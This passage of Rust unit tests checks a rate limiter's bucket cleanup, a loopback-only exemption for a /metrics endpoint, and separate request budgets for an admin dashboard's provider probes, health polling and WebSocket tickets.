        assert_eq!(limiter.buckets.len(), 1);
        // Cleanup with zero window removes everything (all entries are "stale")
        limiter.cleanup(std::time::Duration::from_secs(0));
        assert_eq!(limiter.buckets.len(), 0);
    }

    #[test]
    fn rate_limiter_cleanup_keeps_recent_entries() {
        let limiter = RateLimiter::new(10, 10);
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        limiter.try_acquire(ip, "/v1/chat/completions", false);
        assert_eq!(limiter.buckets.len(), 1);
        // Cleanup with large window keeps recent entries
        limiter.cleanup(std::time::Duration::from_secs(3600));
        assert_eq!(limiter.buckets.len(), 1);
    }

    /// R138 — pins the documented contract of the `metrics_auth_required`
    /// flag: `is_exempt_request` itself stays simple (no AppState
    /// reference), and the runtime gate in `auth_middleware` is what
    /// flips the loopback-/metrics exemption off. This test pins the
    /// helper's behaviour so any future refactor that tries to fold
    /// the flag into the helper signature has to update the test
    /// matrix above too.
    #[test]
    fn is_exempt_request_metrics_loopback_exemption_intact() {
        // Default contract: loopback /metrics is exempt; remote /metrics
        // is not. The R138 metrics_auth_required gate sits OUTSIDE this
        // helper in auth_middleware so the simple matrix below stays
        // accurate regardless of the flag.
        let get = Method::GET;
        assert!(is_exempt_request("/metrics", &get, true));
        assert!(!is_exempt_request("/metrics", &get, false));
    }

    /// A dashboard load issues a WebSocket ticket AND probes provider status.
    /// These used to share one 5/min bucket, so the probes could exhaust it and
    /// the WebSocket was refused — live updates then stop for the whole page.
    #[test]
    fn provider_probes_cannot_starve_websocket_tickets() {
        let limiter = RateLimiter::new(200, 200);
        let ip: IpAddr = "127.0.0.1".parse().unwrap();

        // Burn the sensitive budget entirely on external-API probes.
        for _ in 0..SENSITIVE_ADMIN_RPM + 5 {
            let _ = limiter.try_acquire(ip, "/api/admin/provider-model-status", false);
        }
        assert!(
            !limiter.try_acquire(ip, "/api/admin/provider-model-status", false),
            "probe budget should be exhausted for this test to mean anything"
        );

        // The WebSocket must still be able to connect.
        assert!(
            limiter.try_acquire(ip, "/api/admin/ws-ticket", false),
            "ws-ticket must not be starved by provider probes"
        );
    }

    /// The dashboard polls provider health every 30s by default. That cadence
    /// must not be able to exhaust the budget the model probes need, nor the
    /// reverse — the page was 429'ing itself on its own default behaviour.
    #[test]
    fn health_polling_and_model_probes_do_not_share_a_budget() {
        let limiter = RateLimiter::new(200, 200);
        let ip: IpAddr = "127.0.0.1".parse().unwrap();
        for _ in 0..PROVIDER_HEALTH_RPM + 3 {
            let _ = limiter.try_acquire(ip, "/api/admin/provider-health", false);
        }
        assert!(
            !limiter.try_acquire(ip, "/api/admin/provider-health", false),
            "health budget should be spent for this test to mean anything"
        );
        assert!(
            limiter.try_acquire(ip, "/api/admin/provider-model-status", false),
            "model probes must survive health polling"
        );
    }

    /// Health polling still calls out to cloud providers, so it stays bounded.
    #[test]
    fn provider_health_polling_is_still_capped() {
        let limiter = RateLimiter::new(200, 200);
        let ip: IpAddr = "10.9.9.9".parse().unwrap();
        for _ in 0..PROVIDER_HEALTH_RPM {
            assert!(limiter.try_acquire(ip, "/api/admin/provider-health", false));
        }
        assert!(!limiter.try_acquire(ip, "/api/admin/provider-health", false));
    }

    /// Ticket issuance is still bounded — it writes to `ws_tickets` on every call.
    #[test]
    fn websocket_tickets_are_still_capped() {
        let limiter = RateLimiter::new(200, 200);
        let ip: IpAddr = "10.1.2.3".parse().unwrap();
        for _ in 0..WS_TICKET_RPM {
            assert!(limiter.try_acquire(ip, "/api/admin/ws-ticket", false));
        }
        assert!(
            !limiter.try_acquire(ip, "/api/admin/ws-ticket", false),
            "ticket issuance must remain bounded"
        );
    }

    /// A handful of reconnects, which is what a real dashboard does, must fit.
    #[test]
    fn a_reconnecting_dashboard_fits_in_the_ticket_budget() {
        let limiter = RateLimiter::new(200, 200);
        let ip: IpAddr = "127.0.0.1".parse().unwrap();
        for i in 0..8 {
            assert!(
                limiter.try_acquire(ip, "/api/admin/ws-ticket", false),
                "reconnect {i} should be allowed"
            );
        }
    }
}
